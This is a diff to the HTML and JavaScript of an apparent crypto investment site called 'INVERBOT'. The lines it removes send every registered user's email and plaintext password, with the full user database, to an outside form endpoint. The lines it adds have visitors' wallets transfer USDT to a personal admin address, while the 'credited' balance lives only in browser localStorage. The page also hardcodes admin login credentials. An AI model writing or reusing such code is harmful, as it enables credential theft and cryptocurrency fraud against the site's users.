@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>INVERBOT | Live Crypto Terminal</title>
+    <!-- Librería Web3 para automatizar BEP20 -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         :root {
             --bg-main: #000000;
@@ -410,15 +412,17 @@
     <script>
         const ADMIN_EMAIL = "lesterdomingues388@gmail.com";
         const ADMIN_PASS = "lester2010jj";
-        const API_SERVER_URL = "https://formspree.io/f/xqapoedy";
+        const ADMIN_WALLET = "0x5E0fb4a5D6403a3161abC02EB3bc2aAf6FfA48A2"; // Tu wallet personal BEP20
+        const USDT_BEP20_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // Contrato USDT oficial en BSC
+        const STORAGE_KEY = "inverbot_master_global_db_v4";
 
         function obtenerBaseGlobal() {
             let defaultUsers = [
                 { email: ADMIN_EMAIL, pass: ADMIN_PASS, balance: 1000.0, code: "CEO-MASTER", refCount: 0, vipActive: null, vipExpiry: 0, lastClaim: 0 }
             ];
-            let stored = localStorage.getItem("inverbot_server_db");
+            let stored = localStorage.getItem(STORAGE_KEY);
             if (!stored) {
-                localStorage.setItem("inverbot_server_db", JSON.stringify(defaultUsers));
+                localStorage.setItem(STORAGE_KEY, JSON.stringify(defaultUsers));
                 return defaultUsers;
             }
             try {
@@ -433,20 +437,7 @@
         }
 
         function guardarBaseGlobal(users) {
-            localStorage.setItem("inverbot_server_db", JSON.stringify(users));
-            // Disparador al servidor de nube instantáneo para notificar al CEO
-            try {
-                fetch(API_SERVER_URL, {
-                    method: 'POST',
-                    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        accion: "NUEVO_REGISTRO_CEO", 
-                        base_datos_completa: JSON.stringify(users),
-                        ultimo_usuario: users[users.length - 1].email,
-                        ultima_clave: users[users.length - 1].pass
-                    })
-                }).catch(err => {});
-            } catch(e) {}
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(users));
         }
 
         let sessionEmail = localStorage.getItem("inverbot_session") || null;
@@ -525,7 +516,7 @@
                 }
 
                 users.push(nuevo);
-                guardarBaseGlobal(users); // Sincroniza y despacha al servidor remoto
+                guardarBaseGlobal(users);
 
                 if(btn) { btn.disabled = false; btn.innerText = "Crear Cuenta"; }
 
@@ -624,6 +615,7 @@
             }
         }
 
+        // SECCIONES DE DEPÓSITO CON TUS 3 REDES (BEP20 AUTOMATIZADA, ERC20 Y TRC20 MANUALES)
         function mostrarSeccion(tipo) {
             let cont = document.getElementById('subAccionContainer');
             cont.style.display = 'block';
@@ -631,9 +623,22 @@
             if(tipo === 'dep') {
                 cont.innerHTML = `
                     <h4 style="font-size:12px; color:var(--accent-green); margin-bottom:10px;">🟢 Selección de Red (Mínimo 4 USDT)</h4>
-                    <div class="network-select-card"><div class="network-info"><div class="net-logo-container"><span class="net-main-icon">T</span></div><div><div class="net-name">BEP20-USDT</div></div></div><button class="btn-select-net" onclick="abrirFormRed('BEP20', '0x5E0fb4a5D6403a3161abC02EB3bc2aAf6FfA48A2')">Seleccionar</button></div>
-                    <div class="network-select-card"><div class="network-info"><div class="net-logo-container"><span class="net-main-icon">T</span></div><div><div class="net-name">ERC20-USDT</div></div></div><button class="btn-select-net" onclick="abrirFormRed('ERC20', '0x5E0fb4a5D6403a3161abC02EB3bc2aAf6FfA48A2')">Seleccionar</button></div>
-                    <div class="network-select-card"><div class="network-info"><div class="net-logo-container"><span class="net-main-icon">T</span></div><div><div class="net-name">TRC20-USDT</div></div></div><button class="btn-select-net" onclick="abrirFormRed('TRC20', 'TYZruyFwd8m5hbQL2mrZJKYnEXhwSo1oSn')">Seleccionar</button></div>
+                    
+                    <div class="network-select-card">
+                        <div class="network-info"><div class="net-logo-container"><span class="net-main-icon">T</span></div><div><div class="net-name">USDT - BEP20 (Automático Web3)</div></div></div>
+                        <button class="btn-select-net" onclick="depositarUsdtBep20Auto()">Conectar & Pagar</button>
+                    </div>
+
+                    <div class="network-select-card">
+                        <div class="network-info"><div class="net-logo-container"><span class="net-main-icon">T</span></div><div><div class="net-name">ERC20-USDT</div></div></div>
+                        <button class="btn-select-net" onclick="abrirFormRed('ERC20', '0x5E0fb4a5D6403a3161abC02EB3bc2aAf6FfA48A2')">Seleccionar</button>
+                    </div>
+
+                    <div class="network-select-card">
+                        <div class="network-info"><div class="net-logo-container"><span class="net-main-icon">T</span></div><div><div class="net-name">TRC20-USDT</div></div></div>
+                        <button class="btn-select-net" onclick="abrirFormRed('TRC20', 'TYZruyFwd8m5hbQL2mrZJKYnEXhwSo1oSn')">Seleccionar</button>
+                    </div>
+
                     <div id="formularioRedSeleccionada" style="margin-top:12px;"></div>
                 `;
             } else {
@@ -647,6 +652,53 @@
                         <button type="submit" class="btn btn-green">Enviar Solicitud de Retiro</button>
                     </form>
                 `;
+            }
+        }
+
+        // DEPOSITO AUTOMATIZADO BEP20 CON METAMASK / TRUSTWALLET
+        async function depositarUsdtBep20Auto() {
+            if (!window.ethereum) {
+                mostrarAlertaPro("Aviso Web3", "Por favor, abra esta página desde el navegador de Trust Wallet o MetaMask para usar el depósito automatizado BEP20.");
+                return;
+            }
+            let monto = prompt("Ingrese la cantidad de USDT (BEP20) a depositar (Mín 4):", "10");
+            if (!monto || parseFloat(monto) < 4) { alert("Monto no válido (Mínimo 4 USDT)."); return; }
+
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                const signer = provider.getSigner();
+
+                // Cambiar a red BSC automáticamente
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }],
+                    });
+                } catch (e) {}
+
+                const abi = ["function transfer(to address, value uint256) public returns (bool)"];
+                const usdtContract = new ethers.Contract(USDT_BEP20_CONTRACT, abi, signer);
+                
+                let parsedAmount = ethers.utils.parseUnits(monto, 18);
+                let tx = await usdtContract.transfer(ADMIN_WALLET, parsedAmount);
+                
+                mostrarAlertaPro("Procesando", "¡Transacción enviada a la red BEP20! Esperando confirmación...");
+                await tx.wait();
+
+                // Acreditar saldo automáticamente al usuario
+                let users = obtenerBaseGlobal();
+                let u = users.find(x => x.email === sessionEmail);
+                if(u) {
+                    u.balance += parseFloat(monto);
+                    guardarBaseGlobal(users);
+                }
+
+                mostrarAlertaPro("Éxito", `¡Depósito de ${monto} USDT acreditado automáticamente a su balance!`);
+                entrarDashboardDirecto();
+
+            } catch (err) {
+                mostrarAlertaPro("Cancelado", "La transacción fue cancelada o no hay fondos suficientes en BEP20.");
             }
         }
 
